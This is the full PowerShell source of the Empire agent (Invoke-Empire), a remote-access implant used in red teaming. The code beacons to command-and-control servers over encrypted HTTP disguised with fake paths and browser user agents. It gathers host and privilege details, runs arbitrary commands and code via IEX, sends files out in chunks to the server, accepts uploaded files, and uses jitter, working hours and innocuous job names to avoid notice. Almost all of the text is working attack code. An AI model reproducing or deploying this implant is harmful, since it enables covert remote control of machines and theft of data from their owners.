
function Invoke-Empire {
    <#
        .SYNOPSIS
        The main functionality of the Empire agent.
        Additional functionality can be loaded dynamically.

        Author: @harmj0y
        License: BSD 3-Clause

        .PARAMETER SessionKey
        Server AES session key to use for communications

        .PARAMETER SessionID
        A unique alphanumeric sessionID to use for identification

        .PARAMETER Servers
        Array of C2 servers to use

        .PARAMETER KillDate
        Kill date limit for agent operation

        .PARAMETER KillDays
        Number of days for the bot to operate until exit

        .PARAMETER WorkingHours
        Working hours for agent operation, format "8:00,17:00"

        .PARAMETER Profile
        http communication profile
        request_uris(comma separated)|UserAgents(comma separated)

        .PARAMETER Epoch
        server epoch time, defaults to client time

        .PARAMETER LostLimit
        The limit of the number of checkins the agent will miss before exiting

        .PARAMETER DefaultPage
        The default page string Base64 encoded
    #>

    param(
        [Parameter(Mandatory=$true)]
        [String]
        $SessionKey,

        [Parameter(Mandatory=$true)]
        [String]
        $SessionID,

        [Int32]
        $AgentDelay = 60,

        [Double]
        $AgentJitter = 0,

        [String[]]
        $Servers,

        [String]
        $KillDate,

        [Int32]
        $KillDays,

        [String]
        $WorkingHours,

        [String]
        $Profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",

        [Int32]
        $Epoch = [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s)),

        [Int32]
        $LostLimit = 60,

        [String]
        $DefaultPage = ""
    )

    ############################################################
    # Configuration data
    ############################################################
    
    $script:AgentDelay = $AgentDelay
    $script:AgentJitter = $AgentJitter
    $script:LostLimit = $LostLimit
    $script:MissedCheckins = 0
    $script:DefaultPage = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultPage))
    
    $encoding = [System.Text.Encoding]::ASCII

    $Retries = 1

    # c2 server list, by parameter or preloaded on staging
    if(-not $Servers){
        return
    }
    # the currently active server
    $ServerIndex = 0

    # set a kill date of $KillDays out if specified
    if($KillDays){
        $script:KillDate = (get-date).AddDays($KillDays).ToString('MM/dd/yyyy')
    }

    # extract out our http comms profile
    $script:TaskURIs = $Profile.split("|")[0].split(",")
    $UserAgent = $Profile.split("|")[1]

    # get all the headers/etc. in line for our comms
    $script:Cookie = "SESSIONID=$SessionID"
    $script:SessionID = $SessionID
    $script:UserAgent = $UserAgent;
    $script:Headers = @{}

    # add any additional request headers if there are any specified in the profile
    $parts = $Profile.split("|")
    if($parts[2]){
        $HeadersRaw = $parts[2..$parts.length]
    }

    # add any additional request headers if there are any specified in the profile
    if($HeadersRaw){
        $HeadersRaw | %{
            $key = $_.split(":")[0]
            $value = $_.split(":")[1]

            if ($key-eq "Cookie"){
                # make sure we append this cookie value to the sessionID original
                $script:Cookie = $script:Cookie + ";" +$value

            }
            else{
                $script:Headers.Add($key,$value)
            }
        }
    }

    # background jobs created with format $JobNameBase_[rand]
    $JobNameBase = "Debug32"

    # the currently imported script held in memory
    $script:importedScript = ""

    # calculate the diff between the servers epoch and the agent's
    $script:EpochDiff = $Epoch - [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s))


    ############################################################
    # Command Helpers
    ############################################################

    # set the delay/jitter
    function Set-Delay {
        param([int]$d, [double]$j=0.0)
        $script:AgentDelay = $d
        $script:AgentJitter = $j
        "agent interval set to $script:AgentDelay seconds with a jitter of $script:AgentJitter"
    }

    # get the delay/jitter
    function Get-Delay {
        "agent interval delay interval: $script:AgentDelay seconds with a jitter of $script:AgentJitter"
    }

    function Set-LostLimit {
        param([int]$l)
        $script:LostLimit = $l
        if($l -eq 0)
        {
            "agent set to never die based on checkin Limit"
        }
        else 
        {
            "agent LostLimit set to $script:LostLimit"
        }
    }
    function Get-LostLimit {
        "agent LostLimit: $script:LostLimit"
    }

    # set the killdate for the agent
    function Set-Killdate {
        param([string]$date)
        $script:KillDate = $date
        "agent killdate set to $script:KillDate"
    }

    # get the killdate for the agent
    function Get-Killdate {
        "agent killdate: $script:KillDate"
    }

    # set the working hours for the agent
    function Set-WorkingHours {
        param([string]$hours)
        $script:WorkingHours = $hours
        "agent working hours set to $script:WorkingHours"
    }

    # get the working hours for the agent
    function Get-WorkingHours {
        "agent working hours: $script:WorkingHours"
    }

    # basic system information
    function Get-Sysinfo {
        $str = $Servers[$ServerIndex]
        $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
        $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
        $str += '|' +@{$true=$p[0];$false=$p}[$p.Length -lt 6];
        $str += '|' +(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
        # if we're SYSTEM, we're high integrity
        if(([Environment]::UserName).ToLower() -eq "system"){
            $str += '|True'
        }
        else{
            # otherwise check the groups
            $str += '|'+ ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        }
        $n = [System.Diagnostics.Process]::GetCurrentProcess();
        $str += '|'+$n.ProcessName+'|'+$n.Id;
        $str += '|' + $PSVersionTable.PSVersion.Major
        $str
    }

    # add additional callback servers
    function Add-Servers {
        param([string[]]$BackupServers)
        foreach ($backup in $BackupServers) {
            $Servers = $Servers + $backup
        }
    }

    # handle shell commands and return any results
    function Invoke-ShellCommand {
        param($cmd, $cmdargs="")

        # UNC path normalization for PowerShell
        if ($cmdargs -like "*`"\\*") {
            $cmdargs = $cmdargs -replace "`"\\","FileSystem::`"\"
        }
        elseif ($cmdargs -like "*\\*") {
            $cmdargs = $cmdargs -replace "\\\\","FileSystem::\\"
        }

        $output = ""
        if ($cmd.ToLower() -eq "shell") {
            # if we have a straight 'shell' command, skip the aliases
            if ($cmdargs.length -eq ""){ $output = "no shell command supplied" }
            else { $output = IEX "$cmdargs" }
        }
        else {
            switch -regex ($cmd) {
                '(ls|dir)' {
                    if ($cmdargs.length -eq "") {
                        $output = Get-ChildItem -force | select lastwritetime,length,name
                    }
                    else {
                        try{
                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop | select lastwritetime,length,name"
                        }
                        catch [System.Management.Automation.ActionPreferenceStopException] {
                            $output = "[!] Error: $_ (or cannot be accessed)."
                        }
                    }
                }
                '(mv|move|copy|cp|rm|del|rmdir)' {
                    if ($cmdargs.length -ne "") { 
                        try {
                            IEX "$cmd $cmdargs -Force -ErrorAction Stop"
                            $output = "executed $cmd $cmdargs"
                        } 
                        catch {
                            $output=$_.Exception;
                        }
                    }                    
                }
                cd { 
                    if ($cmdargs.length -ne "")
                    {
                        $cmdargs = $cmdargs.trim("`"").trim("'")
                        cd "$cmdargs"
                        $output = pwd
                    }
                }
                '(ipconfig|ifconfig)' {
                    $output = Get-WmiObject -class "Win32_NetworkAdapterConfiguration" | ? {$_.IPEnabled -Match "True"} | % {
                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'Description' $_.Description
                        $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress
                        $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled
                        $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join ",")
                        $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join ",")
                        $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join ",")
                        $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join ",")
                        $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName
                        $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",")
                        $out
                    } | fl | Out-String | %{$_ + "`n"}
                }
                # this is stupid how complicated it is to get this information...
                '(ps|tasklist)' { 
                    $owners = @{}
                    Get-WmiObject win32_process | % {$o = $_.getowner(); if(-not $($o.User)){$o="N/A"} else {$o="$($o.Domain)\$($o.User)"}; $owners[$_.handle] = $o}
                    if($cmdargs -ne "") { $p = $cmdargs }
                    else{ $p = "*" }
                    $output = Get-Process $p | % {
                        $arch = "x64"
                        if ([System.IntPtr]::Size -eq 4){
                            $arch = "x86"
                        }
                        else{
                            foreach($module in $_.modules) {
                                if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
                                    $arch = "x86"
                                    break
                                }
                            }
                        }
                        $out = New-Object psobject
                        $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                        $out | Add-Member Noteproperty 'PID' $_.ID
                        $out | Add-Member Noteproperty 'Arch' $arch
                        $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()]
                        $mem = "{0:N2} MB" -f $($_.WS/1MB)
                        $out | Add-Member Noteproperty 'MemUsage' $mem
                        $out
                    } | Sort-Object -Property PID
                }
                getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
                route {
                    if (($cmdargs.length -eq "") -or ($cmdargs.lower() -eq "print")){ 
                        # build a table of adapter interfaces indexes -> IP address for the adapater
                        $adapters = @{}
                        Get-WmiObject Win32_NetworkAdapterConfiguration | %{ $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress }
                        $output = Get-WmiObject win32_IP4RouteTable | %{
                            $out = New-Object psobject
                            $out | Add-Member Noteproperty 'Destination' $_.Destination
                            $out | Add-Member Noteproperty 'Netmask' $_.Mask
                            if ($_.NextHop -eq "0.0.0.0"){
                                $out | Add-Member Noteproperty 'NextHop' "On-link"
                            }
                            else{
                                $out | Add-Member Noteproperty 'NextHop' $_.NextHop
                            }
                            if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne "")){
                                $out | Add-Member Noteproperty 'Interface' $($adapters[$_.InterfaceIndex] -join ",")
                            }
                            else {
                                $out | Add-Member Noteproperty 'Interface' '127.0.0.1'
                            }
                            $out | Add-Member Noteproperty 'Metric' $_.Metric1
                            $out
                        } | ft -autosize | Out-String
                    }
                    else { $output = route $cmdargs }
                }
                '(whoami|getuid)' { $output = [Security.Principal.WindowsIdentity]::GetCurrent().Name }
                hostname {
                    $output = [System.Net.Dns]::GetHostByName(($env:computerName))
                }
                '(reboot|restart)' { Restart-Computer -force }
                shutdown { Stop-Computer -force }
                default {
                    if ($cmdargs.length -eq ""){ $output = IEX $cmd }
                    else { $output = IEX "$cmd $cmdargs" }
                }
            }
        }
        "`n"+($output | Format-Table -wrap | Out-String)
    }

    function Start-AgentJob {
        param($data)

        # generate a randomized job name
        $r=1..5|ForEach-Object{Get-Random -max 36};
        $type=('abcdefghijklmnopqrstuvwxyz1234567890'[$r] -join '');
        $JobName = $JobNameBase + "_" + $type

        # kick this code off in the background
        $job = Start-Job -Name $JobName -Scriptblock ([scriptblock]::Create($data))
        $job.Name
    }

    # update the http comms profile
    function Update-Profile {
        param($Profile)

        # format:
        #   uris(comma separated)|UserAgent|header1=val|header2=val2...
        #   headers are optional. format is "key:value"
        #   ex- cookies are "cookie:blah=123;meh=456"

        # extract out the new tasking URIs
        $script:TaskURIs = $Profile.split("|")[0].split(",")

        # extract out the new UserAgent
        $script:UserAgent = $Profile.split("|")[1]

        # reset the cookie
        $script:Cookie = "SESSIONID=$($script:SessionID)"

        # reset the header hash table
        $script:Headers = @{}

        # get the new headers
        $parts = $Profile.split("|")
        if($parts[2]){
            $HeadersRaw = $parts[2..$parts.length]
        }

        # add any additional request headers if there are any specified in the profile
        if($HeadersRaw){
            $HeadersRaw | %{
                $key = $_.split(":")[0]
                $value = $_.split(":")[1]

                if ($key-eq "Cookie"){
                    # make sure we append this cookie value to the sessionID original
                    $script:Cookie = $script:Cookie + ";" +$value

                }
                else{
                    $script:Headers.Add($key,$value)
                }
            }
        }
        "Agent updated with profile $Profile"
    }

    # get a binary part of a file based on $Index and $ChunkSize
    # and return a base64 encoding of that file part (by default)
    # used by download functionality for large file
    function Get-FilePart {

        Param(
            [string] $File,
            [int] $Index = 0,
            [int] $ChunkSize = 512KB,
            [switch] $NoBase64
        )

        try{
            $f = Get-Item "$File"
            $FileLength = $f.length
            $FromFile = [io.file]::OpenRead($File)

            if ($FileLength -lt $ChunkSize) {
                if($Index -eq 0){
                    $buff = new-object byte[] $FileLength
                    $count = $FromFile.Read($buff, 0, $buff.Length)
                    if($NoBase64){
                        $buff;
                    }
                    else{
                        [System.Convert]::ToBase64String($buff)
                    }
                }
                else{
                    $Null;
                }
            }
            else{
                $buff = new-object byte[] $ChunkSize
                $Start = $Index * $($ChunkSize)

                $null = $FromFile.Seek($Start,0)

                $count = $FromFile.Read($buff, 0, $buff.Length)

                if ($count -gt 0) {
                    if($count -ne $ChunkSize){
                        # if we're on the last file chunk

                        # create a new array of the appropriate length
                        $buff2 = new-object byte[] $count
                        # and copy the relevant data into it
                        [array]::copy($buff, $buff2, $count)

                        if($NoBase64){
                            $buff2;
                        }
                        else{
                            [System.Convert]::ToBase64String($buff2)
                        }
                    }
                    else{
                        if($NoBase64){
                            $buff;
                        }
                        else{
                            [System.Convert]::ToBase64String($buff)
                        }
                    }
                }
                else{
                    $Null; 
                }
            }
        }
        catch{}
        finally {
            $FromFile.Close()
        }
    }


    ############################################################
    # Encryption functions
    ############################################################

    function Encrypt-Bytes { 
        param($bytes)
        # get a random IV
        $IV = [byte] 0..255 | Get-Random -count 16
        $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
        $AES.Mode = "CBC";
        $AES.Key = $encoding.GetBytes($SessionKey);
        $AES.IV = $IV;
        $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
        # append the MAC
        $hmac = New-Object System.Security.Cryptography.HMACSHA1;
        $hmac.Key = $encoding.GetBytes($SessionKey);
        $ciphertext + $hmac.ComputeHash($ciphertext);
    } 

    function Decrypt-Bytes { 
        param ($inBytes)
        if($inBytes.Length -gt 32){
            # Verify the MAC
            $mac = $inBytes[-20..-1];
            $inBytes = $inBytes[0..($inBytes.length - 21)];
            $hmac = New-Object System.Security.Cryptography.HMACSHA1;
            $hmac.Key = $encoding.GetBytes($SessionKey);
            $expected = $hmac.ComputeHash($inBytes);
            if (@(Compare-Object $mac $expected -sync 0).Length -ne 0){
                return;
            }

            # extract the IV
            $IV = $inBytes[0..15];
            $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
            $AES.Mode = "CBC";
            $AES.Key = $encoding.GetBytes($SessionKey);
            $AES.IV = $IV;
            ($AES.CreateDecryptor()).TransformFinalBlock(($inBytes[16..$inBytes.length]), 0, $inBytes.Length-16)
        }
    }

    ############################################################
    # C2 functions
    ############################################################

    function Encode-Packet {
        param([int]$type, $data)
        # encode a packet for transport
        #   format - [type][counter][length][value]

        # in case we get a result array, make sure we join everything up
        if ($data -is [system.array]){
            $data = $data -join "`n"
        }
        
        #convert data to base64 so we can support all encodings and handle on server side
        $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($data))

        $packet = New-Object Byte[] (12 + $data.Length)

        # calculate the counter = epochDiff from server + current epoch
        $counter = $($script:EpochDiff + [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s))) -as [int]

        ([bitconverter]::GetBytes($type)).CopyTo($packet, 0)
        ([bitconverter]::GetBytes($counter)).CopyTo($packet, 4)
        ([bitconverter]::GetBytes($data.Length)).CopyTo($packet, 8)
        ([System.Text.Encoding]::UTF8.getbytes($data)).CopyTo($packet, 12)

        $packet
    }

    function Decode-Packet {
        param($packet, $offset=0)
        # we're decoding the raw decrypted bytes to [type][counter][length][value][remaining packet data]
        # the calling logic can keep looking through the data blob,
        #   decoding additional packets as needed

        $type = [bitconverter]::ToUInt32($packet, 0+$offset)
        $counter = [bitconverter]::ToUInt32($packet, 4+$offset)
        $length = [bitconverter]::ToUInt32($packet, 8+$offset)
        $data = [System.Text.Encoding]::UTF8.GetString($packet[(12+$offset)..(12+$length+$offset-1)])
        $remaining = [System.Text.Encoding]::UTF8.GetString($packet[(12+$length+$offset)..($packet.Length)])

        Remove-Variable packet;

        @($type,$counter,$length,$data,$remaining)
    }

    # send a message to the current C2 server
    function Send-Message {
        # param($type, $data)
        param($packets)

        if($packets) {
            # build and encrypt the response packet
            $encBytes = Encrypt-Bytes $packets

            if($Servers[$ServerIndex].StartsWith("http")){
                # build the web request object
                $wc = new-object system.net.WebClient
                # set the proxy settings for the WC to be the default system settings
                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                $wc.Headers.Add("User-Agent",$script:UserAgent)
                $wc.Headers.Add("Cookie",$script:Cookie)
                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}

                try{
                    # get a random posting URI
                    $taskURI = $script:TaskURIs | Get-Random
                    $response = $wc.UploadData($Servers[$ServerIndex]+$taskURI,"POST",$encBytes);
                    # TODO: process response ID at all?
                }
                catch [System.Net.WebException]{
                    # exception posting data...
                    # TODO: handle? server fallback?
                }
            }
        }
    }

    # process a single packet extracted from a tasking
    function Process-Packet {
        param($type, $msg)

        try {

            # sysinfo request
            if($type -eq 1){
                return Encode-Packet -type $type -data $(Get-Sysinfo)
            }
            # agent exit
            elseif($type -eq 2){
                $msg = "[!] Agent "+$script:SessionID+" exiting"
                # this is the only time we send a message out of the normal process,
                #   because we're exited immediately after
                Send-Message $(Encode-Packet -type $type -data $msg)
                exit
            }
            # shell command
            elseif($type -eq 40){
                $parts = $data.Split(" ")

                # if the command has no arguments
                if($parts.Length -eq 1){
                    $cmd = $parts[0]
                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd) -join "`n").trim()
                }
                # if the command has arguments
                else{
                    $cmd = $parts[0]
                    $cmdargs = $parts[1..$parts.length] -join " "
                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join "`n").trim()
                }
            }
            # file download
            elseif($type -eq 41){
                try{
                		$parts = $data.Split(" ")
                		if($parts.Length -ne 1){
                			$path = Get-Childitem $parts[0] | %{$_.FullName}
                			# chunk size in Ko
                			try {
                				# Invoke-Expression = risk of RCE :-/
                				#$ChunkSize = Invoke-Expression $parts[1];
                				# ToInt is more secure but do not allows expression with KB, MB...
                				$ChunkSize = [convert]::ToInt32($parts[1], 10)*1024;
                			} catch {
                				$ChunkSize = 512KB;
                			}
                			if ($ChunkSize -le 64KB){
                				# hard coded floor limit
                				$ChunkSize = 64KB;
                			}	elseif ($ChunkSize -gt 8MB){
                				# hard coded ceil limit, no real reason to limit to 8MB ;-)
												$ChunkSize = 8MB;
											}
										} else {
											$path = Get-Childitem $data | %{$_.FullName}
											$ChunkSize = 512KB
										}
                		$path = Get-Childitem $parts[0] | %{$_.FullName}
                    # read in and send 512kb chunks for as long as the file has more parts
                    $Index = 0
                    do{
                        $EncodedPart = Get-FilePart -File "$path" -Index $Index -ChunkSize $ChunkSize
                        
                        if($EncodedPart){
                            $data = "{0}|{1}|{2}" -f $Index, $path, $EncodedPart
                            Send-Message (Encode-Packet -type $type -data $($data))
                            $Index += 1
                            
                            # if there are more parts of the file, sleep for the specified interval
                            if ($script:AgentDelay -ne 0){
                                $min = [int]((1-$script:AgentJitter)*$script:AgentDelay)
                                $max = [int]((1+$script:AgentJitter)*$script:AgentDelay)

                                if ($min -eq $max){
                                    $sleepTime = $min
                                }
                                else{
                                    $sleepTime = Get-Random -minimum $min -maximum $max;
                                }
                                Start-Sleep -s $sleepTime;
                            }
                        }
                        [GC]::Collect()
                    } while($EncodedPart)

                    Encode-Packet -type 40 -data "[*] File download of $path completed"
                }
                catch{
                    Encode-Packet -type 0 -data "file does not exist or cannot be accessed"
                }
            }
            # file upload
            elseif($type -eq 42){
                $parts = $data.split("|")
                $filename = $parts[0]
                $base64part = $parts[1]
                # get the raw file contents and save it to the specified location
                $Content = [System.Convert]::FromBase64String($base64part)
                try{
                    Set-Content -Path $filename -Value $Content -Encoding Byte
                    Encode-Packet -type $type -data "[*] Upload of $fileName successful"
                }
                catch {
                    Encode-Packet -type 0 -data "[!] Error in writing file during upload"
                }
            }

            # return the currently running jobs
            elseif($type -eq 50){
               Encode-Packet -data ((Get-Job -name ($JobNameBase + "*") | % {$_.name}) -join "`n") -type $type
            }
            # stop and remove a specific job if it's running
            elseif($type -eq 51){
                $job = Get-Job -name $data
                $jobName = $data
                # send result data if there is any
                try{
                    # $data = Receive-Job -name $job | Select-Object -Property * -ExcludeProperty RunspaceID | fl | Out-String
                    $data = Receive-Job -name $job

                    if ($data -is [system.array]){
                        $data = $data -join ""
                    }
                    $data = $data | fl | Out-String

                    if($data -and $($data.trim() -ne '')) {
                        Encode-Packet -type $type -data $($data)
                    }
                    Stop-Job $job
                    Remove-Job $job
                    Encode-Packet -type 51 -data "Job $jobName killed."
                }
                catch {
                    Encode-Packet -type 0 -data "error in stopping job"
                }
            }

            # dynamic code execution, wait for output, don't save output
            elseif($type -eq 100){
                # # original method:
                # # $null = IEX $data
                Encode-Packet -type $type -data (IEX $data)

                # $ps = [PowerShell]::Create()
                # # $runspace = [runspacefactory]::CreateRunspace()
                # # $runspace.open()
                # # $ps.runspace = $runspace
                # $null = $ps.AddScript( [scriptblock]::Create($data) )
                # $output = $ps.invoke() | out-string

                # # cleanup
                # # $ps.runspace.Dispose()
                # # $ps.stop()
                # $null = $ps.Dispose()
                # $ps = $null
                # $null = Remove-Variable ps;

                # # send back the results
                # Encode-Packet -type $type -data $output;
                # $null = Remove-Variable output;
                # [GC]::Collect()
            }
            # dynamic code execution, wait for output, save output
            elseif($type -eq 101){

                # format- [15 chars of prefix][5 chars extension][data]
                $prefix = $data.Substring(0,15)
                $extension = $data.Substring(15,5)
                $data = $data.Substring(20)

                # $ps = [PowerShell]::Create()
                # $runspace = [runspacefactory]::CreateRunspace()
                # $runspace.open()
                # $ps.runspace = $runspace
                # $null = $ps.AddScript( [scriptblock]::Create($data) )
                # $output = $ps.invoke() | out-string

                # # cleanup
                # $ps.runspace.Dispose()
                # $ps = $null

                # send back the results
                Encode-Packet -type $type -data ($prefix + $extension + (IEX $data))
            }
            # dynamic code execution, no wait, don't save output
            elseif($type -eq 110){
                $jobID = Start-AgentJob $data
                Encode-Packet -type $type -data ("Job started: " + $jobID)
            }
            # dynamic code execution, no wait, save output
            elseif($type -eq 111){
                # format- [15 chars of prefix][5 chars extension][data]
                $prefix = $data.Substring(0,15)
                $extension = $data.Substring(15,5)
                $data = $data.Substring(20)

                $jobID = Start-AgentJob $data $prefix $extension
                Encode-Packet -type 110 -data ("Job started: " + $jobID)
            }

            # import a dynamic script and save it in agent memory
            elseif($type -eq 120){
                # encrypt the script for storage
                $script:importedScript = Encrypt-Bytes $encoding.getbytes($data);
                Encode-Packet -type $type -data "script successfully saved in memory"
            }
            # execute a function in the currently imported script
            elseif($type -eq 121){
                
                # decrypt the script in memory and execute the code as a background job
                $script = Decrypt-Bytes $script:importedScript
                if ($script){
                    $jobID = Start-AgentJob ([System.Text.Encoding]::UTF8.GetString($script) + "; $data")
                    Encode-Packet -type $type -data ("Job started: " + $jobID)
                }
            }

            else{
                Encode-Packet -type 0 -data "invalid type: $type"
            }
        }
        catch [System.Exception] {
            Encode-Packet -type $type -data "error running command: $_"
        }
    }

    # process a fetched tasking from the C2 server
    function Process-Tasking {
        param($tasking)

        # Decrypt the tasking and process it appropriately
        $taskingBytes = Decrypt-Bytes $tasking
        if (!$taskingBytes){
            return
        }

        # decode the first packet
        $decoded = Decode-Packet $taskingBytes

        $type = $decoded[0]
        $counter = $decoded[1]
        $length = $decoded[2]
        $data = $decoded[3]

        # any remaining sections of the packet
        $remaining = $decoded[4]

        # calculate what the server's epoch should be based on the epoch diff
        #   this is just done for the first packet in a queue
        $ServerEpoch = [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s)) - $script:EpochDiff
        # if the epoch counter isn't within a +/- 10 minute range (600 seconds)
        #   skip processing this packet
        if ($counter -lt ($ServerEpoch-600) -or $counter -gt ($ServerEpoch+600)){
            return
        }

        # process the first part of the packet
        $resultPackets = $(Process-Packet $type $data)

        $offset = 12 + $length
        # process any additional packets in the tasking
        while($remaining.Length -ne 0){
            $decoded = Decode-Packet $taskingBytes $offset
            $type = $decoded[0]
            $counter = $decoded[1]
            $length = $decoded[2]
            $data = $decoded[3]
            $remaining = $decoded[4]

            # process the new sub-packet and add it to the result set
            $resultPackets += $(Process-Packet $type $data)

            $offset += $(12 + $length)
        }

        # send all the result packets back to the C2 server
        Send-Message $resultPackets
    }

    # get a task from the c2 server
    function Get-Task {
        try{

            if ($Servers[$ServerIndex].StartsWith("http")){
                # build the web request object
                $wc = new-object system.net.WebClient
                # set the proxy settings for the WC to be the default system settings
                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                $wc.Headers.Add("User-Agent",$script:UserAgent)
                $wc.Headers.Add("Cookie",$script:Cookie)
                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}

                # choose a random valid URI for checkin
                $taskURI = $script:TaskURIs | Get-Random
                $result = $wc.DownloadData($Servers[$ServerIndex] + $taskURI)
                $result
            }
        }
        catch [Net.WebException] {
            $script:MissedCheckins+=1

            # handle host not found/reachable?
            # if($_.Exception -match "(403)"){
            #     Write-Host "403!!"
            # }
        }
    }

    ############################################################
    # Execute main functionality
    ############################################################

    while ($True){

        # check the kill date if one is specified
        if(($script:KillDate) -and ((Get-Date) -gt $script:KillDate)) {
            
            # get any job results and kill the jobs
            $packets = $null
            Get-Job -name ($JobNameBase + "*") | %{
                # $data = Receive-Job $_ | Select-Object -Property * -ExcludeProperty RunspaceID | fl | Out-String
                # $data = Receive-Job $_ | fl | Out-String
                $data = Receive-Job $_

                if ($data -is [system.array]){
                    $data = $data -join ""
                }
                $data = $data | fl | Out-String

                if($data){
                    $packets += $(Encode-Packet -type 110 -data $($data))
                }
                Stop-Job $_
                Remove-Job $_
            }
            # send job results back if there are any
            if ($packets){
                Send-Message $packets
            }

            # send an exit status message and die
            # $msg = "[!] Agent "+$script:SessionID+" exiting: past killdate"
            $msg = "[!] Agent "+$script:SessionID+" exiting: past killdate"
            Send-Message $(Encode-Packet -type 2 -data $msg)

            exit
        }
        if((!($script:LostLimit -eq 0)) -and ($script:MissedCheckins -gt $script:LostLimit))
        {

            # get any job results and kill the jobs
            $packets = $null
            Get-Job -name ($JobNameBase + "*") | %{
                # $data = Receive-Job $_ | Select-Object -Property * -ExcludeProperty RunspaceID | fl | Out-String
                # $data = Receive-Job $_ | fl | Out-String
                $data = Receive-Job $_

                if ($data -is [system.array]){
                    $data = $data -join ""
                }
                $data = $data | fl | Out-String

                if($data){
                    $packets += $(Encode-Packet -type 110 -data $($data))
                }
                Stop-Job $_
                Remove-Job $_
            }

            # send an exit status message and die
            $msg = "[!] Agent "+$script:SessionID+" exiting: Lost limit reached"
            Send-Message $(Encode-Packet -type 2 -data $msg)

            exit
        }

        if($Servers[$ServerIndex].StartsWith("http")){

            # if there are working hours set, make sure we're operating within the given time span
            #   format is "8:00-17:00"
            if ($script:WorkingHours -match '^[0-9]{1,2}:[0-5][0-9]-[0-9]{1,2}:[0-5][0-9]$'){
                
                $current = Get-Date
                $start = Get-Date ($script:WorkingHours.split("-")[0])
                $end = Get-Date ($script:WorkingHours.split("-")[1])

                # correct for hours that span overnight
                if (($end-$start).hours -lt 0) {
                    $start = $start.AddDays(-1)
                }

                # if the current time is past the start time
                $startCheck = $current -ge $start

                # if the current time is less than the end time
                $endCheck = $current -le $end

                # if the current time falls outside the window
                if ((-not $startCheck) -or (-not $endCheck)) {

                    # sleep until the operational window starts again
                    $sleepSeconds = ($start - $current).TotalSeconds

                    if($sleepSeconds -lt 0) {
                        # correct for hours that span overnight
                        $sleepSeconds = ($start.addDays(1) - $current).TotalSeconds
                    }
                    Start-Sleep -s $sleepSeconds
                }
            }

            # if there's a delay (i.e. no interactive/delay 0) then
            # sleep for the specified time
            if ($script:AgentDelay -ne 0){
                $min = [int]((1-$script:AgentJitter)*$script:AgentDelay)
                $max = [int]((1+$script:AgentJitter)*$script:AgentDelay)

                if ($min -eq $max){
                    $sleepTime = $min
                }
                else{
                    $sleepTime = Get-Random -minimum $min -maximum $max;
                }
                Start-Sleep -s $sleepTime;
            }

            # poll running jobs, receive any data, and remove any completed jobs
            Get-Job -name ($JobNameBase + "*") | %{
                if($_.HasMoreData){
                    # make sure we don't return the RunspaceId field
                    # $data = Receive-Job $_ | Select-Object -Property * -ExcludeProperty RunspaceID | fl | Out-String
                    # $data = Receive-Job $_ | fl | Out-String
                    $data = Receive-Job $_

                    if ($data -is [system.array]){
                        $data = $data -join ""
                    }
                    $data = $data | fl | Out-String


                    if($data){
                        $encoded = Encode-Packet -type 110 -data $($data)
                        Send-Message $encoded
                    }
                }
                if($_.State -eq "Completed"){
                    Remove-Job $_
                }
            }

            # get the next task from the server
            $data = Get-Task

            #Check to see if we got data
            if ($data) {
                #did we get a default page
                if ([System.Text.Encoding]::UTF8.GetString($data) -eq $script:DefaultPage) {
                    $script:MissedCheckins=0
                }
                #we did not get a default, check for erros and process the tasking
                elseif (-not ([System.Text.Encoding]::UTF8.GetString($data) -eq $script:DefaultPage)) {
                    # check if an error was received
                    if ($data.GetType().Name -eq "ErrorRecord"){
                        $statusCode = [int]$_.Exception.Response.StatusCode
                        if ($statusCode -eq 0){

                        }
                    }
                    else {
                        # if we get data with no error, process the packet
                        $script:MissedCheckins=0
                        Process-Tasking $data
                    }

                }
                else {
                    #No data... wierd?
                
                }
            }
            # force garbage collection to clean up :)
            [GC]::Collect()
        }
    }
}
